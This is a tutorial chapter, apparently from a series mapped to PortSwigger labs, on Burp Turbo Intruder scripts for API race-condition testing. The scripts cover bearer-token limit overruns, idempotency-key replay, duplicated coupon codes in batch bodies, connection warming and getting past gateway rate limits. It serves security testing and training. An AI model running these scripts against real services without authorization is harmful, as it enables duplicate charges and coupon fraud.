# 6. Turbo Intruder for API Race Conditions

## Prerequisite

This assumes basic Turbo Intruder usage and the `race-single-packet-attack.py`
template concept from the general Race Conditions series. This file covers only the
configuration changes and script modifications that are specific to API endpoints:
bearer-token authentication, JSON body construction, idempotency key handling, and
batch/array payload generation.

## 6.1 Baseline template recap (for context only)

The general series covers the baseline single-packet attack template:

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                            concurrentConnections=1,
                            engine=Engine.BURP2)
    for i in range(20):
        engine.queue(target.req, gate='1')
    engine.openGate('1')

def handleResponse(req, interesting):
    table.add(req)
```

This file does not re-explain `gate`, `openGate`, or `Engine.BURP2` — see the general
series for that. Everything below assumes this baseline and layers API-specific
changes on top.

## 6.2 Script 1: Limit-overrun race against a bearer-token authenticated endpoint

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                            concurrentConnections=1,
                            engine=Engine.BURP2)

    # Base request captured from Burp, with the Authorization header
    # and JSON body already present in target.req exactly as sent by
    # a legitimate client. No per-request randomization needed here —
    # every queued request should be byte-identical, since the goal is
    # to replay the SAME operation N times against the SAME token.
    for i in range(20):
        engine.queue(target.req, gate='1')

    engine.openGate('1')

def handleResponse(req, interesting):
    # Track HTTP status and a marker string specific to your target's
    # success/failure response body, e.g. '"success":true' for a JSON API.
    if '"success":true' in req.response:
        table.add(req)
```

**Flag-by-flag / line-by-line breakdown of what's API-specific here:**

- `target.req` — captured directly from Burp's proxy history for the authenticated
  API call. Unlike a cookie-session web request, there is no CSRF token or session
  ID to strip or regenerate per request (per File 1, section 1.1 — statelessness
  means the same static bearer token is valid and safe to replay verbatim across all
  queued requests without triggering session-lock serialization).
- `concurrentConnections=1` and `engine=Engine.BURP2` — unchanged from the general
  series; this is what enables the single-packet attack. Requires the target to
  support HTTP/2, which most modern API gateways do — verify with a quick check of
  the response `HTTP` version in Burp before relying on this.
- `handleResponse` — matches against a JSON success marker instead of an HTML string,
  since API responses are typically JSON. Adjust the marker string to your specific
  target's response schema (e.g. check for a specific field name and value pair
  rather than a generic string, to avoid false positives from error messages that
  happen to contain the word "success").

## 6.3 Script 2: Idempotency key parallel-replay test (File 4, section 4.2)

This is the one place where you must deliberately **override** Turbo Intruder's
common default behavior of randomizing a token per request. Since the entire point
of this test is to send the *same* idempotency key on every request, do not use
`%s` substitution with a wordlist here unless you are deliberately generating a
fresh key per request for the different-keys variant (section 4.3).

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                            concurrentConnections=1,
                            engine=Engine.BURP2)

    # target.req must already contain a fixed Idempotency-Key header
    # value, captured once from a real client request. Do NOT let this
    # vary across queued requests for this specific test.
    for i in range(15):
        engine.queue(target.req, gate='1')

    engine.openGate('1')

def handleResponse(req, interesting):
    table.add(req)
    # Manually inspect: a correct implementation returns 15 IDENTICAL
    # response bodies (the cached result of the first charge). A
    # vulnerable implementation shows more than one DISTINCT successful
    # charge — e.g. differing transaction IDs in the response body
    # despite an identical idempotency key.
```

**What to look for in results:** don't just check status codes. A vulnerable
implementation frequently still returns `200 OK` on every duplicate — the tell is a
**distinct transaction/charge ID in the response body across more than one
response**, which proves more than one actual charge occurred despite the shared
idempotency key. Sort the Turbo Intruder results table by response body content or
export and diff them if the table view doesn't make this obvious at a glance.

## 6.4 Script 3: Different idempotency keys, freshly generated per request (File 4, section 4.3)

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                            concurrentConnections=1,
                            engine=Engine.BURP2)

    import uuid
    for i in range(15):
        key = str(uuid.uuid4())
        # updateHeader / string replacement swaps in a freshly generated
        # idempotency key for each queued request, while everything else
        # (amount, account, auth) stays identical to target.req.
        req = target.req.replace(
            'Idempotency-Key: PLACEHOLDER',
            'Idempotency-Key: ' + key
        )
        engine.queue(req, gate='1')

    engine.openGate('1')

def handleResponse(req, interesting):
    table.add(req)
```

**API-specific note:** `target.req.replace(...)` requires that your captured base
request contains a literal placeholder string (`PLACEHOLDER` here) in place of the
real idempotency key, which you set manually in Burp before sending to Turbo
Intruder. This is different from the wordlist-based `%s` substitution shown in
Turbo Intruder's own bundled examples — using Python's native `uuid` module inside
the script itself avoids needing to pre-generate a wordlist file of UUIDs, and
guarantees no accidental key collision across the batch.

## 6.5 Script 4: Batch/array endpoint duplicate-element test (File 1, section 1.3)

This test does not require Turbo Intruder's concurrency features at all — it is a
single request with a crafted body, and is included here mainly to show why you
should reach for this before any timing-based script:

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                            concurrentConnections=1,
                            engine=Engine.BURP2)

    body = '{"coupon_codes": ["SAVE10","SAVE10","SAVE10","SAVE10","SAVE10"]}'
    req = target.req.replace(target.req.split('\r\n\r\n')[1], body)
    engine.queue(req)

def handleResponse(req, interesting):
    table.add(req)
```

**Why Turbo Intruder even for a single request:** mainly convenience — reusing the
same tool and response-table workflow as the rest of this file's tests. Burp Repeater
alone is equally sufficient for this specific test since there's no timing component;
use whichever is faster in your workflow.

## 6.6 Configuring connection warming for wide-window chain races (File 2)

For multi-step chain races where the window is architecturally wide (distributed
microservices, File 1 section 1.2), precise single-packet timing is often
unnecessary, but if you find inconsistent results, apply connection warming as
covered in the general series, adapted here for an API bearer-token context:

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                            concurrentConnections=1,
                            engine=Engine.BURP2)

    # Warm the connection with an inconsequential authenticated GET
    # (e.g. a profile or health-check endpoint under the same token)
    # before firing the actual confirm/withdraw requests, to smooth
    # out backend connection-establishment delay per the general
    # series' "connection warming" concept.
    engine.queue(warm_req, gate='1')
    for i in range(10):
        engine.queue(confirm_req, gate='1')

    engine.openGate('1')

def handleResponse(req, interesting):
    table.add(req)
```

`warm_req` and `confirm_req` are two separately captured requests (unlike the
single-request-type scripts above) — this is the one script in this file where
`target.req` alone isn't sufficient, since you need two distinct captured requests
assigned to two Python variables before queuing.

## 6.7 WAF / API gateway relevance for Turbo Intruder specifically

- If a gateway enforces per-key concurrency limits (File 1, section 1.4), Turbo
  Intruder's `concurrentConnections=1` setting (required for the single-packet
  attack) is already aligned with testing a single connection — but if you need to
  test whether concurrency limits are enforced per-token rather than per-connection,
  you'll need multiple valid tokens for the same underlying resource, which requires
  modifying the script to rotate the `Authorization` header per queued request
  rather than reusing `target.req` verbatim, similar to the idempotency key rotation
  in section 6.4.
- If you observe `429` responses appearing partway through a batch sent via
  `openGate`, this indicates gateway-level rate limiting interfering with your
  attack — consider the rate-limit-abuse technique from the general series
  (deliberately triggering the limit first to introduce a uniform server-side delay)
  before concluding the underlying endpoint isn't vulnerable.
- Turbo Intruder's HTTP/2 requirement for the single-packet attack (`Engine.BURP2`)
  means this entire technique is unavailable against any API gateway or backend that
  only serves HTTP/1.1 — confirm the protocol version in Burp's response info panel
  before spending time debugging a script that will never achieve the intended
  synchronization on an HTTP/1.1-only target. In that case, fall back to GraphQL
  aliased batching (File 3) if a GraphQL endpoint exists, or to the multi-step chain
  race approach (File 2), since both are unaffected by the HTTP/2 requirement.

## What's next

File 7 is the final consolidated cheatsheet and the complete PortSwigger lab mapping
(Apprentice → Practitioner → Expert), plus the crAPI supplementary practice mapping.
